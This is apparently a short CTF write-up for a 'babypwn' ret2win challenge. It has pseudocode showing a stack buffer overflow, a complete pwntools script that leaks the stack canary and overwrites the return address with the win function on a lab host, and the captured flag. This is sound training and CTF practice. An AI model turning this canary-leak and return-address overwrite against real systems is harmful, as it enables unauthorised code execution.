# PWN
## babypwn

![](assets/image%2035.png)

![](assets/image%2036.png)

```
❯ nm -n classic | grep win
0000000000401216 T win

on main func 

char buf[0x60];

read(0, buf, 0x78);   // overflow it exceed 
printf("%s", buf);    // leak
read(0, buf, 0x78);   // second overflow
```

```
from pwn import *

HOST = 'pwn.labs.nerdslab.in'
PORT = 1337

elf = ELF('./classic', checksec=False)

for i in range(200):
    p = remote(HOST, PORT)

    # wait for prompt
    p.recvuntil(b'ever again.\n')

    # Stage 1: leak canary
    p.send(b'A' * 0x59)

    p.recvuntil(b'What?\n')
    leak = p.recvline().strip()

    idx = leak.find(b'A' * 0x59)
    if idx == -1:
        p.close()
        continue

    tail = leak[idx + 0x59:]

    if len(tail) < 7:
        p.close()
        continue

    canary = b'\x00' + tail[:7]

    # Stage 2: exploit
    p.recvuntil(b'Try saying that again buddy...\n')

    payload = b'B' * 0x58 + canary + b'C' * 8 + p64(elf.symbols['win'])
    p.send(payload)

    out = p.recvall(timeout=2)

    if b'flag' in out.lower():
        print(out.decode(errors='ignore'))
        break

    p.close()
```

this classic pwn ret2win

```
defcon{1s_It_r3a1ly_4_CTF_with0ut_4_r3t_2_w1n?}
```
